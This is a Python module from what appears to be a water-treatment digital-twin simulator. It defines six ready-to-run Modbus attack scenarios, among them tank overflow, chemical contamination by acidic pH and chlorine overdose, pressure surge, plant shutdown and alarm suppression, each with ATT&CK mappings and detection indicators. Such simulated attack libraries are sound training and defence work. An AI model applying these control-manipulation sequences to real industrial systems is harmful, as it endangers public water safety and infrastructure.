"""
Pre-built attack scenario library.

Curated collection of realistic OT attack scenarios for the water treatment
plant, each with full MITRE ATT&CK mapping. Users can list and run these
without needing to craft payloads manually.
"""

from __future__ import annotations

from ot_twin.llm_generator.mitre_mapping import get_technique
from ot_twin.models import AttackScenario, AttackStep, MitreTechnique, RegisterType


def _resolve_techniques(*ids: str) -> list[MitreTechnique]:
    return [t for tid in ids if (t := get_technique(tid)) is not None]


SCENARIO_LIBRARY: dict[str, AttackScenario] = {
    "tank-overflow": AttackScenario(
        name="tank-overflow",
        description="Overflow the water tank by maximizing inflow and blocking outflow",
        objective="Cause physical damage through tank overflow",
        steps=[
            AttackStep(order=1, description="Scan current setpoints",
                       function_code=3, start_address=0, count=11),
            AttackStep(order=2, description="Close outlet valve",
                       function_code=5, register_type=RegisterType.COIL,
                       start_address=1, values=[0]),
            AttackStep(order=3, description="Max inflow rate to 100 L/min",
                       function_code=6, start_address=1, values=[100]),
            AttackStep(order=4, description="Raise high-level alarm threshold to hide overflow",
                       function_code=6, start_address=9, values=[100],
                       delay_seconds=1.0),
        ],
        mitre_techniques=_resolve_techniques("T0831", "T0836", "T0879"),
        estimated_impact="Tank overflow causing water damage and potential equipment failure",
        detection_indicators=[
            "Outlet valve closed while inflow rate increased",
            "Alarm threshold modified outside maintenance window",
            "Tank level rising above 90% with no alarm",
        ],
    ),

    "chemical-contamination": AttackScenario(
        name="chemical-contamination",
        description="Contaminate water supply by manipulating pH and chlorine dosing",
        objective="Render treated water unsafe for consumption",
        steps=[
            AttackStep(order=1, description="Read current chemical parameters",
                       function_code=3, start_address=3, count=2),
            AttackStep(order=2, description="Disable mixer to prevent proper mixing",
                       function_code=5, register_type=RegisterType.COIL,
                       start_address=3, values=[0]),
            AttackStep(order=3, description="Set pH to dangerous acidic level (2.0)",
                       function_code=6, start_address=3, values=[200]),
            AttackStep(order=4, description="Overdose chlorine to toxic level (5.0 mg/L)",
                       function_code=6, start_address=4, values=[500],
                       delay_seconds=0.5),
        ],
        mitre_techniques=_resolve_techniques("T0831", "T0836", "T0879", "T0880"),
        estimated_impact="Water supply contamination — public health risk",
        detection_indicators=[
            "pH setpoint changed to value outside 6.0-8.5 range",
            "Chlorine dosing increased beyond safety threshold",
            "Mixer disabled during chemical dosing",
        ],
    ),

    "pressure-surge": AttackScenario(
        name="pressure-surge",
        description="Create dangerous pressure buildup by maxing pump with closed outlet",
        objective="Cause pipe rupture through excessive pressure",
        steps=[
            AttackStep(order=1, description="Read current pressure and pump values",
                       function_code=3, start_address=5, count=4),
            AttackStep(order=2, description="Close outlet valve",
                       function_code=5, register_type=RegisterType.COIL,
                       start_address=1, values=[0]),
            AttackStep(order=3, description="Set pump to maximum speed (3600 RPM)",
                       function_code=6, start_address=8, values=[3600]),
            AttackStep(order=4, description="Raise pressure alarm threshold to mask danger",
                       function_code=6, start_address=5, values=[100],
                       delay_seconds=1.0),
        ],
        mitre_techniques=_resolve_techniques("T0831", "T0836", "T0879"),
        estimated_impact="Pipe rupture causing flooding and equipment destruction",
        detection_indicators=[
            "Pump speed set to maximum while outlet closed",
            "Pressure alarm threshold raised during operation",
            "Pressure readings increasing beyond normal range",
        ],
    ),

    "full-shutdown": AttackScenario(
        name="full-shutdown",
        description="Shut down the entire water treatment plant",
        objective="Denial of service — stop all water treatment",
        steps=[
            AttackStep(order=1, description="Activate emergency stop",
                       function_code=5, register_type=RegisterType.COIL,
                       start_address=5, values=[1]),
            AttackStep(order=2, description="Disable main pump",
                       function_code=5, register_type=RegisterType.COIL,
                       start_address=2, values=[0], delay_seconds=0.2),
            AttackStep(order=3, description="Close inlet valve",
                       function_code=5, register_type=RegisterType.COIL,
                       start_address=0, values=[0], delay_seconds=0.2),
            AttackStep(order=4, description="Close outlet valve",
                       function_code=5, register_type=RegisterType.COIL,
                       start_address=1, values=[0], delay_seconds=0.2),
            AttackStep(order=5, description="Disable chlorine pump",
                       function_code=5, register_type=RegisterType.COIL,
                       start_address=4, values=[0]),
        ],
        mitre_techniques=_resolve_techniques("T0826", "T0827", "T0828"),
        estimated_impact="Complete loss of water treatment capability",
        detection_indicators=[
            "Emergency stop activated without operator action",
            "All actuators disabled in rapid succession",
            "System running status changed to false",
        ],
    ),

    "stealth-setpoint-drift": AttackScenario(
        name="stealth-setpoint-drift",
        description="Gradually shift setpoints to degrade water quality without triggering alarms",
        objective="Slowly degrade process without detection",
        steps=[
            AttackStep(order=1, description="Read baseline setpoints",
                       function_code=3, start_address=0, count=11),
            AttackStep(order=2, description="Slightly increase inflow (12 L/min)",
                       function_code=6, start_address=1, values=[12],
                       delay_seconds=2.0),
            AttackStep(order=3, description="Slightly decrease outflow (8 L/min)",
                       function_code=6, start_address=2, values=[8],
                       delay_seconds=2.0),
            AttackStep(order=4, description="Nudge pH setpoint down (6.8)",
                       function_code=6, start_address=3, values=[680],
                       delay_seconds=2.0),
            AttackStep(order=5, description="Reduce chlorine slightly (1.2 mg/L)",
                       function_code=6, start_address=4, values=[120],
                       delay_seconds=2.0),
        ],
        mitre_techniques=_resolve_techniques("T0836", "T0831"),
        estimated_impact="Gradual water quality degradation — hard to detect",
        detection_indicators=[
            "Multiple setpoint changes in short window",
            "All changes biased in same direction (toward unsafe)",
            "No corresponding operator login or maintenance ticket",
        ],
    ),

    "alarm-suppression": AttackScenario(
        name="alarm-suppression",
        description="Suppress alarms to hide an ongoing attack from operators",
        objective="Blind operators to dangerous process state",
        steps=[
            AttackStep(order=1, description="Read current alarm thresholds",
                       function_code=3, start_address=9, count=2),
            AttackStep(order=2, description="Set high-level alarm to maximum (100%)",
                       function_code=6, start_address=9, values=[100]),
            AttackStep(order=3, description="Set low-level alarm to minimum (0%)",
                       function_code=6, start_address=10, values=[0],
                       delay_seconds=0.5),
            AttackStep(order=4, description="Acknowledge any existing alarms",
                       function_code=5, register_type=RegisterType.COIL,
                       start_address=6, values=[1]),
        ],
        mitre_techniques=_resolve_techniques("T0836", "T0829", "T0880"),
        estimated_impact="Loss of operator visibility — alarms silenced during attack",
        detection_indicators=[
            "Alarm thresholds modified to extreme values",
            "Alarm acknowledge without prior alarm event",
            "Threshold change not correlated with maintenance schedule",
        ],
    ),
}


def get_scenario(name: str) -> AttackScenario | None:
    """Look up a pre-built scenario by name."""
    return SCENARIO_LIBRARY.get(name)


def list_scenarios() -> list[dict[str, str]]:
    """Return metadata for all pre-built scenarios."""
    return [
        {
            "name": s.name,
            "description": s.description,
            "objective": s.objective,
            "steps": str(len(s.steps)),
            "mitre": ", ".join(t.technique_id for t in s.mitre_techniques),
        }
        for s in SCENARIO_LIBRARY.values()
    ]
